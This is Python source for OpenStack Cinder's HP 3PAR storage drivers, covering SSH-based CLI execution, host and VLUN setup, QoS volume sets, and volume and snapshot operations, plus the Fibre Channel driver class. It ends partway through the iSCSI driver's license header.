        # Mebibytes, Gigibytes, not Megabytes.
        MB = 1000L
        MiB = 1.048576

        if int(vol_size) == 0:
            capacity = MB  # default: 1GB
        else:
            capacity = vol_size * MB

        capacity = int(round(capacity / MiB))
        return capacity

    def _cli_run(self, cmd):
        """"""Runs a CLI command over SSH, without doing any result parsing.""""""
        LOG.debug(""SSH CMD = %s "" % cmd)

        (stdout, stderr) = self._run_ssh(cmd, False)

        # we have to strip out the input and exit lines
        tmp = stdout.split(""\r\n"")
        out = tmp[5:len(tmp) - 2]
        return out

    def _ssh_execute(self, ssh, cmd, check_exit_code=True):
        """"""We have to do this in order to get CSV output from the CLI command.

        We first have to issue a command to tell the CLI that we want the
        output to be formatted in CSV, then we issue the real command.
        """"""
        LOG.debug(_('Running cmd (SSH): %s'), cmd)

        channel = ssh.invoke_shell()
        stdin_stream = channel.makefile('wb')
        stdout_stream = channel.makefile('rb')
        stderr_stream = channel.makefile('rb')

        stdin_stream.write('''setclienv csvtable 1
%s
exit
''' % cmd)

        # stdin.write('process_input would go here')
        # stdin.flush()

        # NOTE(justinsb): This seems suspicious...
        # ...other SSH clients have buffering issues with this approach
        stdout = stdout_stream.read()
        stderr = stderr_stream.read()
        stdin_stream.close()
        stdout_stream.close()
        stderr_stream.close()

        exit_status = channel.recv_exit_status()

        # exit_status == -1 if no exit code was returned
        if exit_status != -1:
            LOG.debug(_('Result was %s') % exit_status)
            if check_exit_code and exit_status != 0:
                raise exception.ProcessExecutionError(exit_code=exit_status,
                                                      stdout=stdout,
                                                      stderr=stderr,
                                                      cmd=cmd)
        channel.close()
        return (stdout, stderr)

    def _run_ssh(self, cmd_list, check_exit=True, attempts=1):
        utils.check_ssh_injection(cmd_list)
        command = ' '. join(cmd_list)

        if not self.sshpool:
            self.sshpool = utils.SSHPool(self.config.san_ip,
                                         self.config.san_ssh_port,
                                         self.config.ssh_conn_timeout,
                                         self.config.san_login,
                                         password=self.config.san_password,
                                         privatekey=
                                         self.config.san_private_key,
                                         min_size=
                                         self.config.ssh_min_pool_conn,
                                         max_size=
                                         self.config.ssh_max_pool_conn)
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        return self._ssh_execute(ssh, command,
                                                 check_exit_code=check_exit)
                    except Exception as e:
                        LOG.error(e)
                        greenthread.sleep(randint(20, 500) / 100.0)
                msg = (_(""SSH Command failed after '%(total_attempts)r' ""
                         ""attempts : '%(command)s'"") %
                       {'total_attempts': total_attempts, 'command': command})
                raise paramiko.SSHException(msg)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_(""Error running ssh command: %s"") % command)

    def _delete_3par_host(self, hostname):
        self._cli_run(['removehost', hostname])

    def _create_3par_vlun(self, volume, hostname):
        out = self._cli_run(['createvlun', volume, 'auto', hostname])
        if out and len(out) > 1:
            if ""must be in the same domain"" in out[0]:
                err = out[0].strip()
                err = err + "" "" + out[1].strip()
                raise exception.Invalid3PARDomain(err=err)

    def _safe_hostname(self, hostname):
        """"""We have to use a safe hostname length for 3PAR host names.""""""
        try:
            index = hostname.index('.')
        except ValueError:
            # couldn't find it
            index = len(hostname)

        # we'll just chop this off for now.
        if index > 23:
            index = 23

        return hostname[:index]

    def _get_3par_host(self, hostname):
        out = self._cli_run(['showhost', '-verbose', hostname])
        LOG.debug(""OUTPUT = \n%s"" % (pprint.pformat(out)))
        host = {'id': None, 'name': None,
                'domain': None,
                'descriptors': {},
                'iSCSIPaths': [],
                'FCPaths': []}

        if out:
            err = out[0]
            if err == 'no hosts listed':
                msg = {'code': 'NON_EXISTENT_HOST',
                       'desc': ""HOST '%s' was not found"" % hostname}
                raise hpexceptions.HTTPNotFound(msg)

            # start parsing the lines after the header line
            for line in out[1:]:
                if line == '':
                    break
                tmp = line.split(',')
                paths = {}

                LOG.debug(""line = %s"" % (pprint.pformat(tmp)))
                host['id'] = tmp[0]
                host['name'] = tmp[1]

                portPos = tmp[4]
                LOG.debug(""portPos = %s"" % (pprint.pformat(portPos)))
                if portPos == '---':
                    portPos = None
                else:
                    port = portPos.split(':')
                    portPos = {'node': int(port[0]), 'slot': int(port[1]),
                               'cardPort': int(port[2])}

                paths['portPos'] = portPos

                # If FC entry
                if tmp[5] == 'n/a':
                    paths['wwn'] = tmp[3]
                    host['FCPaths'].append(paths)
                # else iSCSI entry
                else:
                    paths['name'] = tmp[3]
                    paths['ipAddr'] = tmp[5]
                    host['iSCSIPaths'].append(paths)

            # find the offset to the description stuff
            offset = 0
            for line in out:
                if line[:15] == '---------- Host':
                    break
                else:
                    offset += 1

            info = out[offset + 2]
            tmp = info.split(':')
            host['domain'] = tmp[1]

            info = out[offset + 4]
            tmp = info.split(':')
            host['descriptors']['location'] = tmp[1]

            info = out[offset + 5]
            tmp = info.split(':')
            host['descriptors']['ipAddr'] = tmp[1]

            info = out[offset + 6]
            tmp = info.split(':')
            host['descriptors']['os'] = tmp[1]

            info = out[offset + 7]
            tmp = info.split(':')
            host['descriptors']['model'] = tmp[1]

            info = out[offset + 8]
            tmp = info.split(':')
            host['descriptors']['contact'] = tmp[1]

            info = out[offset + 9]
            tmp = info.split(':')
            host['descriptors']['comment'] = tmp[1]

        return host

    def get_ports(self):
        # First get the active FC ports
        out = self._cli_run(['showport'])

        # strip out header
        # N:S:P,Mode,State,----Node_WWN----,-Port_WWN/HW_Addr-,Type,
        # Protocol,Label,Partner,FailoverState
        out = out[1:len(out) - 2]

        ports = {'FC': [], 'iSCSI': {}}
        for line in out:
            tmp = line.split(',')

            if tmp:
                if tmp[1] == 'target' and tmp[2] == 'ready':
                    if tmp[6] == 'FC':
                        ports['FC'].append(tmp[4])

        # now get the active iSCSI ports
        out = self._cli_run(['showport', '-iscsi'])

        # strip out header
        # N:S:P,State,IPAddr,Netmask,Gateway,
        # TPGT,MTU,Rate,DHCP,iSNS_Addr,iSNS_Port
        out = out[1:len(out) - 2]
        for line in out:
            tmp = line.split(',')

            if tmp and len(tmp) > 2:
                if tmp[1] == 'ready':
                    ports['iSCSI'][tmp[2]] = {}

        # now get the nsp and iqn
        result = self._cli_run(['showport', '-iscsiname'])
        if result:
            # first line is header
            # nsp, ip,iqn
            result = result[1:]
            for line in result:
                info = line.split("","")
                if info and len(info) > 2:
                    if info[1] in ports['iSCSI']:
                        nsp = info[0]
                        ip_addr = info[1]
                        iqn = info[2]
                        ports['iSCSI'][ip_addr] = {'nsp': nsp,
                                                   'iqn': iqn
                                                   }

        LOG.debug(""PORTS = %s"" % pprint.pformat(ports))
        return ports

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_volume_stats()

        return self.stats

    def _update_volume_stats(self):
        # const to convert MiB to GB
        const = 0.0009765625

        # storage_protocol and volume_backend_name are
        # set in the child classes
        stats = {'driver_version': '1.0',
                 'free_capacity_gb': 'unknown',
                 'reserved_percentage': 0,
                 'storage_protocol': None,
                 'total_capacity_gb': 'unknown',
                 'QoS_support': True,
                 'vendor_name': 'Hewlett-Packard',
                 'volume_backend_name': None}

        try:
            cpg = self.client.getCPG(self.config.hp3par_cpg)
            if 'limitMiB' not in cpg['SDGrowth']:
                total_capacity = 'infinite'
                free_capacity = 'infinite'
            else:
                total_capacity = int(cpg['SDGrowth']['limitMiB'] * const)
                free_capacity = int((cpg['SDGrowth']['limitMiB'] -
                                    cpg['UsrUsage']['usedMiB']) * const)

            stats['total_capacity_gb'] = total_capacity
            stats['free_capacity_gb'] = free_capacity
        except hpexceptions.HTTPNotFound:
            err = (_(""CPG (%s) doesn't exist on array"")
                   % self.config.hp3par_cpg)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

        self.stats = stats

    def create_vlun(self, volume, host):
        """"""Create a VLUN.

        In order to export a volume on a 3PAR box, we have to create a VLUN.
        """"""
        volume_name = self._get_3par_vol_name(volume['id'])
        self._create_3par_vlun(volume_name, host['name'])
        return self.client.getVLUN(volume_name)

    def delete_vlun(self, volume, hostname):
        volume_name = self._get_3par_vol_name(volume['id'])
        vlun = self.client.getVLUN(volume_name)
        self.client.deleteVLUN(volume_name, vlun['lun'], hostname)
        self._delete_3par_host(hostname)

    def _get_volume_type(self, type_id):
        ctxt = context.get_admin_context()
        return volume_types.get_volume_type(ctxt, type_id)

    def _get_key_value(self, hp3par_keys, key, default=None):
        if hp3par_keys is not None and key in hp3par_keys:
            return hp3par_keys[key]
        else:
            return default

    def _get_qos_value(self, qos, key, default=None):
        if key in qos:
            return qos[key]
        else:
            return default

    def _get_qos_by_volume_type(self, volume_type):
        qos = {}
        specs = volume_type.get('extra_specs')
        for key, value in specs.iteritems():
            if 'qos:' in key:
                fields = key.split(':')
                key = fields[1]
            if key in self.hp_qos_keys:
                qos[key] = int(value)
        return qos

    def _get_keys_by_volume_type(self, volume_type):
        hp3par_keys = {}
        specs = volume_type.get('extra_specs')
        for key, value in specs.iteritems():
            if ':' in key:
                fields = key.split(':')
                key = fields[1]
            if key in self.hp3par_valid_keys:
                hp3par_keys[key] = value
        return hp3par_keys

    def _set_qos_rule(self, qos, vvs_name):
        max_io = self._get_qos_value(qos, 'maxIOPS')
        max_bw = self._get_qos_value(qos, 'maxBWS')
        cli_qos_string = """"
        if max_io is not None:
            cli_qos_string += ('-io %s ' % max_io)
        if max_bw is not None:
            cli_qos_string += ('-bw %sM ' % max_bw)
        self._cli_run(['setqos', '%svvset:%s' % (cli_qos_string, vvs_name)])

    def _add_volume_to_volume_set(self, volume, volume_name,
                                  cpg, vvs_name, qos):
        if vvs_name is not None:
            # Admin has set a volume set name to add the volume to
            self._cli_run(['createvvset', '-add', vvs_name, volume_name])
        else:
            vvs_name = self._get_3par_vvs_name(volume['id'])
            domain = self.get_domain(cpg)
            self._cli_run(['createvvset', '-domain', domain, vvs_name])
            self._set_qos_rule(qos, vvs_name)
            self._cli_run(['createvvset', '-add', vvs_name, volume_name])

    def _remove_volume_set(self, vvs_name):
        # Must first clear the QoS rules before removing the volume set
        self._cli_run(['setqos', '-clear', 'vvset:%s' % (vvs_name)])
        self._cli_run(['removevvset', '-f', vvs_name])

    def _remove_volume_from_volume_set(self, volume_name, vvs_name):
        self._cli_run(['removevvset', '-f', vvs_name, volume_name])

    def get_cpg(self, volume, allowSnap=False):
        volume_name = self._get_3par_vol_name(volume['id'])
        vol = self.client.getVolume(volume_name)
        if 'userCPG' in vol:
            return vol['userCPG']
        elif allowSnap:
            return vol['snapCPG']
        return None

    def _get_3par_vol_comment(self, volume_name):
        vol = self.client.getVolume(volume_name)
        if 'comment' in vol:
            return vol['comment']
        return None

    def get_persona_type(self, volume, hp3par_keys=None):
        default_persona = self.valid_persona_values[0]
        type_id = volume.get('volume_type_id', None)
        volume_type = None
        if type_id is not None:
            volume_type = self._get_volume_type(type_id)
            if hp3par_keys is None:
                hp3par_keys = self._get_keys_by_volume_type(volume_type)
        persona_value = self._get_key_value(hp3par_keys, 'persona',
                                            default_persona)
        if persona_value not in self.valid_persona_values:
            err = _(""Must specify a valid persona %(valid)s, ""
                    ""value '%(persona)s' is invalid."") % \
                   ({'valid': self.valid_persona_values,
                     'persona': persona_value})
            raise exception.InvalidInput(reason=err)
        # persona is set by the id so remove the text and return the id
        # i.e for persona '1 - Generic' returns 1
        persona_id = persona_value.split(' ')
        return persona_id[0]

    def get_volume_settings_from_type(self, volume):
        cpg = None
        snap_cpg = None
        volume_type = None
        vvs_name = None
        hp3par_keys = {}
        qos = {}
        type_id = volume.get('volume_type_id', None)
        if type_id is not None:
            volume_type = self._get_volume_type(type_id)
            hp3par_keys = self._get_keys_by_volume_type(volume_type)
            vvs_name = self._get_key_value(hp3par_keys, 'vvs')
            if vvs_name is None:
                qos = self._get_qos_by_volume_type(volume_type)

        cpg = self._get_key_value(hp3par_keys, 'cpg',
                                  self.config.hp3par_cpg)
        if cpg is not self.config.hp3par_cpg:
            # The cpg was specified in a volume type extra spec so it
            # needs to be validiated that it's in the correct domain.
            self.validate_cpg(cpg)
            # Also, look to see if the snap_cpg was specified in volume
            # type extra spec, if not use the extra spec cpg as the
            # default.
            snap_cpg = self._get_key_value(hp3par_keys, 'snap_cpg', cpg)
        else:
            # default snap_cpg to hp3par_cpg_snap if it's not specified
            # in the volume type extra specs.
            snap_cpg = self.config.hp3par_cpg_snap
            # if it's still not set or empty then set it to the cpg
            # specified in the cinder.conf file.
            if not self.config.hp3par_cpg_snap:
                snap_cpg = cpg

        # if provisioning is not set use thin
        default_prov = self.valid_prov_values[0]
        prov_value = self._get_key_value(hp3par_keys, 'provisioning',
                                         default_prov)
        # check for valid provisioning type
        if prov_value not in self.valid_prov_values:
            err = _(""Must specify a valid provisioning type %(valid)s, ""
                    ""value '%(prov)s' is invalid."") % \
                   ({'valid': self.valid_prov_values,
                     'prov': prov_value})
            raise exception.InvalidInput(reason=err)

        tpvv = True
        if prov_value == ""full"":
            tpvv = False

        # check for valid persona even if we don't use it until
        # attach time, this will give the end user notice that the
        # persona type is invalid at volume creation time
        self.get_persona_type(volume, hp3par_keys)

        return {'cpg': cpg, 'snap_cpg': snap_cpg,
                'vvs_name': vvs_name, 'qos': qos,
                'tpvv': tpvv, 'volume_type': volume_type}

    def create_volume(self, volume):
        LOG.debug(""CREATE VOLUME (%s : %s %s)"" %
                  (volume['display_name'], volume['name'],
                   self._get_3par_vol_name(volume['id'])))
        try:
            comments = {'volume_id': volume['id'],
                        'name': volume['name'],
                        'type': 'OpenStack'}

            name = volume.get('display_name', None)
            if name:
                comments['display_name'] = name

            # get the options supported by volume types
            type_info = self.get_volume_settings_from_type(volume)
            volume_type = type_info['volume_type']
            vvs_name = type_info['vvs_name']
            qos = type_info['qos']
            cpg = type_info['cpg']
            snap_cpg = type_info['snap_cpg']
            tpvv = type_info['tpvv']

            type_id = volume.get('volume_type_id', None)
            if type_id is not None:
                comments['volume_type_name'] = volume_type.get('name')
                comments['volume_type_id'] = type_id
                if vvs_name is not None:
                    comments['vvs'] = vvs_name
                else:
                    comments['qos'] = qos

            extras = {'comment': json.dumps(comments),
                      'snapCPG': snap_cpg,
                      'tpvv': tpvv}

            capacity = self._capacity_from_size(volume['size'])
            volume_name = self._get_3par_vol_name(volume['id'])
            self.client.createVolume(volume_name, cpg, capacity, extras)
            if qos or vvs_name is not None:
                try:
                    self._add_volume_to_volume_set(volume, volume_name,
                                                   cpg, vvs_name, qos)
                except Exception as ex:
                    # Delete the volume if unable to add it to the volume set
                    self.client.deleteVolume(volume_name)
                    LOG.error(str(ex))
                    raise exception.CinderException(ex.get_description())
        except hpexceptions.HTTPConflict:
            raise exception.Duplicate(_(""Volume (%s) already exists on array"")
                                      % volume_name)
        except hpexceptions.HTTPBadRequest as ex:
            LOG.error(str(ex))
            raise exception.Invalid(ex.get_description())
        except exception.InvalidInput as ex:
            LOG.error(str(ex))
            raise ex
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex.get_description())

    def _copy_volume(self, src_name, dest_name, cpg=None, snap_cpg=None,
                     tpvv=True):
        # Virtual volume sets are not supported with the -online option
        cmd = ['createvvcopy', '-p', src_name, '-online']
        if snap_cpg:
            cmd.extend(['-snp_cpg', snap_cpg])
        if tpvv:
            cmd.append('-tpvv')
        if cpg:
            cmd.append(cpg)
        cmd.append(dest_name)
        LOG.debug('Creating clone of a volume with %s' % cmd)
        self._cli_run(cmd)

    def get_next_word(self, s, search_string):
        """"""Return the next word.

        Search 's' for 'search_string', if found return the word preceding
        'search_string' from 's'.
        """"""
        word = re.search(search_string.strip(' ') + ' ([^ ]*)', s)
        return word.groups()[0].strip(' ')

    def _get_3par_vol_comment_value(self, vol_comment, key):
        comment_dict = dict(ast.literal_eval(vol_comment))
        if key in comment_dict:
            return comment_dict[key]
        return None

    def create_cloned_volume(self, volume, src_vref):
        try:
            orig_name = self._get_3par_vol_name(volume['source_volid'])
            vol_name = self._get_3par_vol_name(volume['id'])

            type_info = self.get_volume_settings_from_type(volume)

            # make the 3PAR copy the contents.
            # can't delete the original until the copy is done.
            self._copy_volume(orig_name, vol_name, cpg=type_info['cpg'],
                              snap_cpg=type_info['snap_cpg'],
                              tpvv=type_info['tpvv'])
            return None
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound:
            raise exception.NotFound()
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex)

    def _get_vvset_from_3par(self, volume_name):
        """"""Get Virtual Volume Set from 3PAR.

        The only way to do this currently is to try and delete the volume
        to get the error message.

        NOTE(walter-boring): don't call this unless you know the volume is
        already in a vvset!
        """"""
        cmd = ['removevv', '-f', volume_name]
        LOG.debug(""Issuing remove command to find vvset name %s"" % cmd)
        out = self._cli_run(cmd)
        vvset_name = None
        if out and len(out) > 1:
            if out[1].startswith(""Attempt to delete ""):
                words = out[1].split("" "")
                vvset_name = words[len(words) - 1]

        return vvset_name

    def delete_volume(self, volume):
        try:
            volume_name = self._get_3par_vol_name(volume['id'])
            # Try and delete the volume, it might fail here because
            # the volume is part of a volume set which will have the
            # volume set name in the error.
            try:
                self.client.deleteVolume(volume_name)
            except hpexceptions.HTTPConflict as ex:
                if ex.get_code() == 34:
                    # This is a special case which means the
                    # volume is part of a volume set.
                    vvset_name = self._get_vvset_from_3par(volume_name)
                    LOG.debug(""Returned vvset_name = %s"" % vvset_name)
                    if vvset_name is not None and \
                       vvset_name.startswith('vvs-'):
                        # We have a single volume per volume set, so
                        # remove the volume set.
                        self._remove_volume_set(
                            self._get_3par_vvs_name(volume['id']))
                    elif vvset_name is not None:
                        # We have a pre-defined volume set just remove the
                        # volume and leave the volume set.
                        self._remove_volume_from_volume_set(volume_name,
                                                            vvset_name)
                    self.client.deleteVolume(volume_name)
                else:
                    raise ex

        except hpexceptions.HTTPNotFound as ex:
            # We'll let this act as if it worked
            # it helps clean up the cinder entries.
            LOG.error(str(ex))
        except hpexceptions.HTTPForbidden as ex:
            LOG.error(str(ex))
            raise exception.NotAuthorized(ex.get_description())
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex)

    def create_volume_from_snapshot(self, volume, snapshot):
        """"""Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        LOG.debug(""Create Volume from Snapshot\n%s\n%s"" %
                  (pprint.pformat(volume['display_name']),
                   pprint.pformat(snapshot['display_name'])))

        if snapshot['volume_size'] != volume['size']:
            err = ""You cannot change size of the volume.  It must ""
            ""be the same as the snapshot.""
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

        try:
            snap_name = self._get_3par_snap_name(snapshot['id'])
            volume_name = self._get_3par_vol_name(volume['id'])

            extra = {'volume_id': volume['id'],
                     'snapshot_id': snapshot['id']}

            volume_type = None
            type_id = volume.get('volume_type_id', None)
            vvs_name = None
            qos = {}
            hp3par_keys = {}
            if type_id is not None:
                volume_type = self._get_volume_type(type_id)
                hp3par_keys = self._get_keys_by_volume_type(volume_type)
                vvs_name = self._get_key_value(hp3par_keys, 'vvs')
                if vvs_name is None:
                    qos = self._get_qos_by_volume_type(volume_type)

            name = volume.get('display_name', None)
            if name:
                extra['display_name'] = name

            description = volume.get('display_description', None)
            if description:
                extra['description'] = description

            optional = {'comment': json.dumps(extra),
                        'readOnly': False}

            self.client.createSnapshot(volume_name, snap_name, optional)
            if qos or vvs_name is not None:
                cpg = self._get_key_value(hp3par_keys, 'cpg',
                                          self.config.hp3par_cpg)
                try:
                    self._add_volume_to_volume_set(volume, volume_name,
                                                   cpg, vvs_name, qos)
                except Exception as ex:
                    # Delete the volume if unable to add it to the volume set
                    self.client.deleteVolume(volume_name)
                    LOG.error(str(ex))
                    raise exception.CinderException(ex.get_description())
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound:
            raise exception.NotFound()
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex.get_description())

    def create_snapshot(self, snapshot):
        LOG.debug(""Create Snapshot\n%s"" % pprint.pformat(snapshot))

        try:
            snap_name = self._get_3par_snap_name(snapshot['id'])
            vol_name = self._get_3par_vol_name(snapshot['volume_id'])

            extra = {'volume_name': snapshot['volume_name']}
            vol_id = snapshot.get('volume_id', None)
            if vol_id:
                extra['volume_id'] = vol_id

            try:
                extra['display_name'] = snapshot['display_name']
            except AttributeError:
                pass

            try:
                extra['description'] = snapshot['display_description']
            except AttributeError:
                pass

            optional = {'comment': json.dumps(extra),
                        'readOnly': True}
            if self.config.hp3par_snapshot_expiration:
                optional['expirationHours'] = (
                    self.config.hp3par_snapshot_expiration)

            if self.config.hp3par_snapshot_retention:
                optional['retentionHours'] = (
                    self.config.hp3par_snapshot_retention)

            self.client.createSnapshot(snap_name, vol_name, optional)
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound:
            raise exception.NotFound()

    def delete_snapshot(self, snapshot):
        LOG.debug(""Delete Snapshot\n%s"" % pprint.pformat(snapshot))

        try:
            snap_name = self._get_3par_snap_name(snapshot['id'])
            self.client.deleteVolume(snap_name)
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound as ex:
            LOG.error(str(ex))

    def _get_3par_hostname_from_wwn_iqn(self, wwns_iqn):
        out = self._cli_run(['showhost', '-d'])
        # wwns_iqn may be a list of strings or a single
        # string. So, if necessary, create a list to loop.
        if not isinstance(wwns_iqn, list):
            wwn_iqn_list = [wwns_iqn]
        else:
            wwn_iqn_list = wwns_iqn

        for wwn_iqn in wwn_iqn_list:
            for showhost in out:
                if (wwn_iqn.upper() in showhost.upper()):
                    return showhost.split(',')[1]

    def terminate_connection(self, volume, hostname, wwn_iqn):
        """"""Driver entry point to unattach a volume from an instance.""""""
        try:
            # does 3par know this host by a different name?
            if hostname in self.hosts_naming_dict:
                hostname = self.hosts_naming_dict.get(hostname)
            self.delete_vlun(volume, hostname)
            return
        except hpexceptions.HTTPNotFound as e:
            if 'host does not exist' in e.get_description():
                # use the wwn to see if we can find the hostname
                hostname = self._get_3par_hostname_from_wwn_iqn(wwn_iqn)
                # no 3par host, re-throw
                if (hostname is None):
                    raise
            else:
            # not a 'host does not exist' HTTPNotFound exception, re-throw
                raise

        #try again with name retrieved from 3par
        self.delete_vlun(volume, hostname)

    def parse_create_host_error(self, hostname, out):
        search_str = ""already used by host ""
        if search_str in out[1]:
            #host exists, return name used by 3par
            hostname_3par = self.get_next_word(out[1], search_str)
            self.hosts_naming_dict[hostname] = hostname_3par
            return hostname_3par
/n/n/ncinder/volume/drivers/san/hp/hp_3par_fc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR Fibre Channel Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_fc.HP3PARFCDriver
""""""

from hp3parclient import exceptions as hpexceptions
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)


class HP3PARFCDriver(cinder.volume.driver.FibreChannelDriver):
    """"""OpenStack Fibre Channel driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware,
              copy volume <--> Image.
    """"""

    def __init__(self, *args, **kwargs):
        super(HP3PARFCDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """"""Sanity check to ensure we have required options set.""""""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password',
                          'san_ip', 'san_login', 'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'FC'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()
        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()
        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        The  driver returns a driver_volume_type of 'fibre_channel'.
        The target_wwn can be a single entry or a list of wwns that
        correspond to the list of remote wwn(s) that will export the volume.
        Example return values:

            {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': '1234567890123',
                }
            }

            or

             {
                'driver_volume_type': 'fibre_channel'
                'data': {
                    'target_discovered': True,
                    'target_lun': 1,
                    'target_wwn': ['1234567890123', '0987654321321'],
                }
            }


        Steps to export a volume on 3PAR
          * Create a host on the 3par with the target wwn
          * Create a VLUN for that HOST with the volume we want to export.

        """"""
        self.common.client_login()
        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        ports = self.common.get_ports()

        self.common.client_logout()
        info = {'driver_volume_type': 'fibre_channel',
                'data': {'target_lun': vlun['lun'],
                         'target_discovered': True,
                         'target_wwn': ports['FC']}}
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['wwpns'])
        self.common.client_logout()

    def _create_3par_fibrechan_host(self, hostname, wwns, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same wwn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        command = ['createhost', '-persona', persona_id, '-domain', domain,
                   hostname]
        for wwn in wwns:
            command.append(wwn)

        out = self.common._cli_run(command)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)

        return hostname

    def _modify_3par_fibrechan_host(self, hostname, wwns):
        # when using -add, you can not send the persona or domain options
        command = ['createhost', '-add', hostname]
        for wwn in wwns:
            command.append(wwn)

        out = self.common._cli_run(command)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['FCPaths']:
                self._modify_3par_fibrechan_host(hostname, connector['wwpns'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound as ex:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_fibrechan_host(hostname,
                                                        connector['wwpns'],
                                                        domain,
                                                        persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/ncinder/volume/drivers/san/hp/hp_3par_iscsi.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
